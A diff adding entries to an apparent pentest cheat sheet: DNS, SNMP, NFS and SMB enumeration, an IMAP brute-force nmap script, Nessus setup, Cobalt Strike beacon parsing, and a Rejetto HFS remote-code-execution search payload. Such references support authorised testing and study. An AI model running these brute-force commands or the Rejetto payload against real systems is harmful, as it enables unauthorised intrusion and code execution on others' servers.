@@ -30,6 +30,9 @@ nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-tx
 nslookup 10.10.10.10
 	* server 10.10.10.10
 	* 10.10.10.10
+	
+# Host
+host -t ns megacorpone.com
 
 ```
 
@@ -119,6 +122,15 @@ crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -x whoami
 
 # Enum4linux
 enum4linux 10.10.10.10
+for i in $(cat list.txt); do enum4linux -a $i;done
+
+```
+
+### 143,993 (IMAP)
+
+```bash
+# Nmap
+nmap -sV --script imap-brute -p 143 10.10.10.10
 ```
 
 ### 161,162 (SNMP - UDP)
@@ -135,6 +147,9 @@ snmpwalk -v1 -c public 10.10.10.10
 snmpwalk -c public 10.10.10.10
 snmpwalk -v1 -c public 10.10.10.10 1
 snmpwalk -v1 -c public 10.10.10.10 2
+
+# Onesixtyone
+onesixtyone -c /path/to/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i ip.txt
 ```
 
 ### 636 (LDAP)
@@ -163,6 +178,9 @@ SELECT name FROM master..sysdatabases;
 ### 2049 (NFS MOUNT)
 
 ```bash
+# Nmap
+nmap -sV --script=nfs-showmount <target>
+
 # Showmount
 showmount -e 10.10.10.10
 
@@ -721,6 +739,8 @@ https://github.com/GhostPack/Rubeus
 ### Covenant
 
 ```bash
+# Dotnet Install/Download
+https://dotnet.microsoft.com/download/dotnet/3.1
 
 # Commands
 ImpersonateProcess 1776
@@ -968,6 +988,51 @@ Get-SQLQuery -instance query.bank.local -query "select * from master..sysservers
 
 # References
 https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
+```
+
+### Metasploit
+
+```
+# Set Proxies
+set PROXIES HTTP:127.0.0.1:8080
+```
+
+### Nessus
+
+```bash
+# Download
+https://www.tenable.com/downloads/nessus
+
+# Install
+sudo apt install ./Nessus-8.14.0-debian6_amd64.deb
+
+# Start
+sudo /bin/systemctl start nessusd.service
+
+# Stop
+sudo /bin/systemctl stop nessusd.service
+
+# Web
+https://localhost:8834/
+```
+
+### CobaltStrikeParser
+
+```bash
+# Download 
+https://github.com/Apr4h/CobaltStrikeScan
+
+# Commands 
+python3 parse_beacon_config.py beacon.exe
+
+# Information we can get
+- SleepTime
+- Jitter
+- PublicKey_MD5
+- Port
+- BeaconType
+- HttpPostUri
+- Many more
 ```
 
 # C. SUID/CAP/SUDO/GROUP
@@ -1588,6 +1653,21 @@ https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/
 
 ```
 
+### Rejetto File Server
+
+```bash
+# Exploit
+https://www.exploit-db.com/exploits/39161
+https://www.exploit-db.com/exploits/49584
+
+# Payload (UrlEncode)
+# Execute File
+?search=%00{.exec%7Cwscript.exe%20//B%20//NOLOGO%20%25TEMP%25%5Cpayload.vbs.}
+
+# Payload (UrlDecode)
+# Execute File
+?search= {.exec|wscript.exe //B //NOLOGO %TEMP%\payload.vbs.}
+```
 # F. Reverse Shell
 
 ### PowerShell
@@ -1602,3 +1682,4 @@ https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/
 - https://book.hacktricks.xyz/
 - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
 - https://zer1t0.gitlab.io/posts/attacking_ad/
+- https://pentestbook.six2dez.com/
